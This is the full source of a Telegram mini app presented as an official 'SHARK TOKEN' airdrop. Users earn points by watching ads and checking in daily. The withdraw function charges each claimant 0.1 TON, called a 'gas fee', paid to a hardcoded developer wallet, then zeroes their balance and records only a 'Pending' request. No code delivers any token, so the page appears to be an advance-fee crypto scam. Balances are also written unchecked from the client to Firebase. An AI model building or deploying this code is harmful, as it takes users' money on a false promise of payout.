<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="monetag" content="d686104263ea095e5938f6f704b745b3">
    <script src='//libtl.com/sdk.js' data-zone='10414428' data-sdk='show_10414428'></script>
    <title>SHARK TOKEN - Official Airdrop</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Plus+Jakarta+Sans:wght@300;500;700&display=swap');
        :root {
            --neon-blue: #00d4ff; --neon-purple: #9d00ff; --deep-bg: #010812;
            --glass: rgba(255, 255, 255, 0.03); --border: rgba(0, 212, 255, 0.2); --gray: #8892b0;
        }
        body { margin: 0; background: var(--deep-bg); color: #f8fafd; font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; height: 100vh; }
        .screen { display: none; padding: 20px; height: 82vh; overflow-y: auto; text-align: center; }
        .active-screen { display: block; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .premium-title { font-family: 'Syncopate', sans-serif; letter-spacing: 2px; font-size: 9px; color: var(--neon-blue); text-transform: uppercase; margin-bottom: 15px; }
        .balance-val { font-family: 'Syncopate', sans-serif; font-size: 35px; font-weight: 700; margin: 5px 0; color: #fff; }
        .premium-card { background: var(--glass); border: 1px solid var(--border); border-radius: 20px; padding: 15px; margin-bottom: 12px; backdrop-filter: blur(10px); }
        .btn-premium { background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple)); border: none; padding: 15px; color: white; border-radius: 15px; width: 100%; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; }
        .btn-premium:disabled { background: #1a222c; opacity: 0.5; cursor: not-allowed; }

        /* Modal styling */
        #modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-box { background: #020b18; border: 1px solid var(--neon-blue); width: 88%; border-radius: 25px; padding: 20px; text-align: center; }
        .day-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .day-item { background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 12px 5px; border-radius: 12px; }
        .day-item.done { background: var(--neon-blue); color: #000; font-weight: bold; }
        
        .rank-item { display: flex; align-items: center; justify-content: space-between; padding: 14px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 8px; }
        #nav-bar { position: fixed; bottom: 0; width: 100%; height: 75px; background: rgba(1, 8, 18, 0.98); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; z-index: 100; }
        .nav-item { color: var(--gray); display: flex; flex-direction: column; align-items: center; flex: 1; font-size: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .nav-item.active { color: var(--neon-blue); transform: translateY(-3px); }
    </style>
</head>
<body>

    <div id="home" class="screen active-screen">
        <div style="font-size: 50px; margin-top: 10px;">🦈</div>
        <div class="premium-title">Available Balance</div>
        <div class="balance-val" id="main-bal">0</div>
        
        <div class="premium-card" onclick="openCheckin()" style="display: flex; justify-content: space-between; align-items: center; cursor: pointer; margin-top: 15px;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <i data-lucide="calendar" style="color: var(--neon-blue);"></i>
                <div style="text-align: left;"><div style="font-weight: 700;">Daily Rewards</div><div style="font-size: 10px; color: var(--gray);">Streak to earn more</div></div>
            </div>
            <i data-lucide="chevron-right" style="width: 16px;"></i>
        </div>

        <button id="bonus-btn" class="btn-premium" onclick="watchAdToClaim()" style="margin-top: 10px;">
            <i data-lucide="play-circle"></i> <span id="reward-text">WATCH VIDEO (+10)</span>
        </button>
        <div id="video-count-text" style="font-size: 11px; color: var(--gray); margin-top: 8px; font-weight: bold;">Daily Limit: 0/5 Videos</div>
    </div>

    <div id="wallet" class="screen">
        <div class="premium-title">Digital Wallet</div>
        <div class="premium-card">
            <h1 id="wallet-bal" class="balance-val">0</h1>
            <div id="ton-connect-btn" style="display: flex; justify-content: center; margin: 15px 0;"></div>
            <button class="btn-premium" onclick="handleWithdraw()">
                <i data-lucide="arrow-down-to-line"></i> CLAIM $SHARK
            </button>
            <p style="font-size: 9px; color: #ffc107; margin-top: 10px;">* Network gas fee: 0.1 TON (Sent to dev wallet)</p>
        </div>
        <div class="premium-card" style="text-align: left;">
            <div class="premium-title" style="font-size: 8px;">Your Referral Link</div>
            <div id="ref-link" style="font-size: 10px; background: #000; padding: 12px; border-radius: 8px; word-break: break-all;">Loading...</div>
            <button class="btn-premium" style="padding: 10px;" onclick="copyRef()">COPY LINK</button>
        </div>
    </div>

    <div id="leaderboard" class="screen">
        <div class="premium-title">Shark Ranking</div>
        <div id="leaderboard-container"></div>
    </div>

    <div id="supply" class="screen">
        <div class="premium-title">Token Ecosystem</div>
        <div class="premium-card" style="padding: 40px 20px;">
            <div style="font-size: 12px; color: var(--gray);">Remaining Supply Pool</div>
            <div id="remaining-supply" class="balance-val" style="color: #ff4757;">10,000,000</div>
        </div>
    </div>

    <div id="modal-overlay">
        <div class="modal-box">
            <div class="premium-title">Daily Reward Pool</div>
            <div class="day-grid" id="checkin-grid"></div>
            <button id="claim-now-btn" class="btn-premium" onclick="handleDailyWithAd()">CLAIM NOW</button>
            <button style="background:transparent; border:none; color:var(--gray); margin-top: 15px; font-weight: bold;" onclick="document.getElementById('modal-overlay').style.display='none'">CLOSE</button>
        </div>
    </div>

    <div id="nav-bar">
        <div class="nav-item active" onclick="showScreen('home', this)"><i data-lucide="home"></i><span>Home</span></div>
        <div class="nav-item" onclick="showScreen('wallet', this)"><i data-lucide="wallet"></i><span>Wallet</span></div>
        <div class="nav-item" onclick="showScreen('leaderboard', this); loadLeaderboard();"><i data-lucide="trophy"></i><span>Ranks</span></div>
        <div class="nav-item" onclick="showScreen('supply', this); loadSupply();"><i data-lucide="pie-chart"></i><span>Supply</span></div>
    </div>

    <script>
        lucide.createIcons();
        const firebaseConfig = { apiKey: "AIzaSyDJzyYMY4Iy-shwXkPz7c5ppWr75Wn9ngY", databaseURL: "https://shark-bot-c515b-default-rtdb.firebaseio.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const tg = window.Telegram.WebApp;
        const userId = tg.initDataUnsafe?.user?.id?.toString() || "guest";
        const TOTAL_CAP = 10000000;
        const dailyRewards = [50, 100, 150, 200, 300, 400, 500, 700, 1000];
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://khanemon013111-wq.github.io/MegalodonSharkbot/tonconnect-manifest.json', buttonRootId: 'ton-connect-btn' });

        // Video Ads Logic: 5 Videos limit, 10 tokens reward
        async function watchAdToClaim() {
            db.ref('users/'+userId).once('value', async s => {
                const d = s.val();
                const now = Date.now();
                // 12 hours reset for video tasks
                if (now - (d.lastVideoReset || 0) > 43200000) {
                    await db.ref('users/'+userId).update({ videoCount: 0, lastVideoReset: now });
                }

                if ((d.videoCount || 0) >= 5) {
                    tg.showAlert("Daily video limit reached! Come back in 12 hours.");
                    return;
                }

                if (typeof show_10414428 === 'function') {
                    show_10414428().then(() => {
                        db.ref('users/'+userId).update({ 
                            balance: (d.balance || 0) + 10, 
                            videoCount: (d.videoCount || 0) + 1 
                        });
                        db.ref('global/totalDistributed').transaction(c => (c || 0) + 10);
                        tg.showAlert("Success! +10 $SHARK added to your balance.");
                    });
                }
            });
        }

        // Initialize User with Reset check
        function initUser() {
            if (userId === "guest") return;
            db.ref('users/' + userId).on('value', snap => {
                const d = snap.val();
                if(d) {
                    document.getElementById('main-bal').innerText = (d.balance || 0).toLocaleString();
                    document.getElementById('wallet-bal').innerText = (d.balance || 0).toLocaleString();
                    document.getElementById('video-count-text').innerText = `Daily Limit: ${d.videoCount || 0}/5 Videos`;
                    document.getElementById('ref-link').innerText = "https://t.me/MegalodonSharkbot/shark?startapp=" + userId;
                    refreshCheckinUI(d.streak || 0, d.lastCheckin || 0);

                    // Button Lock UI
                    const videoBtn = document.getElementById('bonus-btn');
                    if (d.videoCount >= 5 && (Date.now() - d.lastVideoReset < 43200000)) {
                        videoBtn.disabled = true;
                        document.getElementById('reward-text').innerText = "LIMIT REACHED";
                    } else {
                        videoBtn.disabled = false;
                        document.getElementById('reward-text').innerText = "WATCH VIDEO (+10)";
                    }
                } else {
                    // Create new profile with 0 balance
                    db.ref('users/' + userId).set({ 
                        name: tg.initDataUnsafe?.user?.first_name || "Shark Miner", 
                        balance: 0, streak: 0, lastCheckin: 0, videoCount: 0, lastVideoReset: 0 
                    });
                }
            });
            loadSupply();
        }

        // Withdrawal Logic: 0.1 TON Gas Fee + Balance Reset
        async function handleWithdraw() {
            if (!tonConnectUI.connected) { tg.showAlert("Please connect TON wallet!"); return; }
            const bal = parseInt(document.getElementById('wallet-bal').innerText.replace(/,/g, ''));
            if (bal <= 0) { tg.showAlert("No balance to claim!"); return; }
            
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: "UQDr2Mh1slwmh1zWHvabVgRI4KgnU6_fG8P_raK67BOPz_sv", // Your TON address
                    amount: "100000000", // 0.1 TON
                }]
            };

            try {
                const result = await tonConnectUI.sendTransaction(transaction);
                if (result) {
                    db.ref('withdraw_requests/' + userId).set({
                        name: tg.initDataUnsafe?.user?.first_name || "User",
                        wallet: tonConnectUI.account.address,
                        amount: bal, status: "Pending", time: new Date().toLocaleString()
                    });
                    // Critical: Reset balance to 0 after success
                    db.ref('users/' + userId).update({ balance: 0 });
                    tg.showAlert("Success! Withdrawal requested. Balance reset to zero.");
                }
            } catch (e) { tg.showAlert("Transaction canceled by user."); }
        }

        // Leaderboard Function
        function loadLeaderboard() {
            db.ref('users').orderByChild('balance').limitToLast(10).once('value', snap => {
                let list = []; snap.forEach(u => { list.push(u.val()); });
                list.sort((a,b) => (b.balance || 0) - (a.balance || 0));
                let html = ''; list.forEach((u, i) => {
                    html += `<div class="rank-item"><div><b>#${i+1}</b> ${u.name || 'Anonymous'}</div><div style="color:var(--neon-blue); font-family:Syncopate; font-size:11px;">${(u.balance || 0).toLocaleString()}</div></div>`;
                });
                document.getElementById('leaderboard-container').innerHTML = html;
            });
        }

        // Checkin UI Helper
        function openCheckin() { document.getElementById('modal-overlay').style.display = 'flex'; }
        
        async function handleDailyWithAd() {
            db.ref('users/'+userId).once('value', async s => {
                const d = s.val();
                let st = (Date.now() - (d.lastCheckin || 0) > 172800000) ? 0 : d.streak || 0;
                let amount = dailyRewards[st % dailyRewards.length];
                if (typeof show_10414428 === 'function') {
                    show_10414428().then(() => { 
                        db.ref('users/' + userId).update({ balance: (d.balance || 0) + amount, streak: st + 1, lastCheckin: Date.now() });
                        db.ref('global/totalDistributed').transaction(c => (c || 0) + amount);
                        document.getElementById('modal-overlay').style.display = 'none';
                        tg.showAlert(`Claimed Day ${st+1} reward: ${amount} $SHARK`);
                    });
                }
            });
        }

        function refreshCheckinUI(streak, last) {
            let html = ''; for(let i=0; i < dailyRewards.length; i++) {
                let cls = (i < (streak % 10)) ? 'done' : '';
                html += `<div class="day-item ${cls}"><span style="font-size:8px;">DAY ${i+1}</span><br><b>${dailyRewards[i]}</b></div>`;
            }
            document.getElementById('checkin-grid').innerHTML = html;
            const canClaim = (Date.now() - last >= 86400000);
            document.getElementById('claim-now-btn').disabled = !canClaim;
            document.getElementById('claim-now-btn').innerText = canClaim ? "CLAIM NOW" : "COME BACK TOMORROW";
        }

        function loadSupply() {
            db.ref('global/totalDistributed').on('value', snap => {
                const dist = snap.val() || 0;
                document.getElementById('remaining-supply').innerText = Math.max(0, TOTAL_CAP - dist).toLocaleString();
            });
        }

        function showScreen(id, el) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active'); lucide.createIcons();
        }

        function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-link').innerText); tg.showAlert("Referral link copied!"); }
        document.addEventListener('DOMContentLoaded', initUser);
    </script>
</body>
</html>
